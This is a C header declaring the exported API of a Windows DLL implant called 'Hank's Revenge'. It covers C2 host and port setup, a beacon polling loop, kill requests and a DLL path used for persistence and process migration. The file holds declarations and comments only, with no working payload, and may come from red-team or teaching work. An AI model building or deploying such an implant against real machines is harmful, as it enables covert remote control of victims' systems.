#pragma once

/*
 * exports.h - DLL-exported API surface for the Hank's Revenge implant.
 *
 * WinSock2.h must precede Windows.h to prevent the legacy winsock1 conflict.
 * WIN32_LEAN_AND_MEAN is guarded so this header is self-sufficient even when
 * included before CMake injects the global definition.
 */
#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif

#include <WinSock2.h>
#include <Windows.h>

#include "command.h"
#include "debug.h"
#include "network.h"
#include "protocol.h"

#ifdef Hank_EXPORTS
#define Hank_API __declspec(dllexport)
#else
#define Hank_API __declspec(dllimport)
#endif

 /**
  * @brief Initializes the implant runtime with a polling target.
  *
  * The runtime refuses initialization if a prior killimplant request has marked
  * the implant for termination.
  *
  * @param host The target C2 host name or IP address.
  * @param port The target C2 port as a wide string.
  *
  * @return TRUE on success, or FALSE if the implant has already been terminated.
  */
Hank_API BOOL HankInitialize();//PCWSTR host, PCWSTR port

/**
 * @brief Starts the polling loop thread for the implant runtime.
 *
 * If no active polling thread exists, this function starts a single background
 * thread that periodically checks the server for queued tasks.
 *
 * @return TRUE on success, or FALSE if thread creation fails.
 */
Hank_API BOOL HankStart(VOID);

/**
 * @brief Terminates the implant runtime and performs debug cleanup checks.
 *
 * This function requests implant termination, stops the polling loop, and runs
 * the debug heap validation helpers.
 *
 * @return VOID
 */
Hank_API VOID HankStop(VOID);

/**
 * @brief Requests full implant termination.
 *
 * After this function is called, future initialization attempts should fail.
 *
 * @return VOID
 */
VOID RequestImplantTermination(VOID);

/**
 * @brief Reports whether the implant has been marked for termination.
 *
 * @return TRUE if a killimplant request has been issued, otherwise FALSE.
 */
BOOL IsImplantTerminationRequested(VOID);

/* ------------------------------------------------------------------
 * Implant runtime control — called by command handlers in command.c
 * ------------------------------------------------------------------ */

 /**
  * @brief Changes the beacon poll interval.
  *
  * Takes effect at the start of the next sleep cycle.
  *
  * @param ms New interval in milliseconds.
  */
VOID SetPollInterval(DWORD ms);

/**
 * @brief Schedules graceful implant termination after the current task result
 *        has been posted to the server.
 *
 * Unlike RequestImplantTermination(), this allows round-trip 2 to complete
 * so the operator actually sees a "completed" status for the kill task.
 */
VOID SetKillPending(VOID);

/**
 * @brief Copies the active C2 host and port strings into caller-supplied buffers.
 *
 * @param hostBuf      Output buffer for the wide-char host string.
 * @param hostBufChars Capacity of hostBuf in WCHARs.
 * @param portBuf      Output buffer for the wide-char port string.
 * @param portBufChars Capacity of portBuf in WCHARs.
 */
VOID GetC2Config(PWSTR hostBuf, DWORD hostBufChars, PWSTR portBuf, DWORD portBufChars);

/**
 * @brief Returns a pointer to the full path of this DLL (captured in DllMain).
 *
 * Used by the persist and migrate command handlers.
 *
 * @return Read-only wide-char string; valid for the lifetime of the process.
 */
PCWSTR GetImplantDllPath(VOID);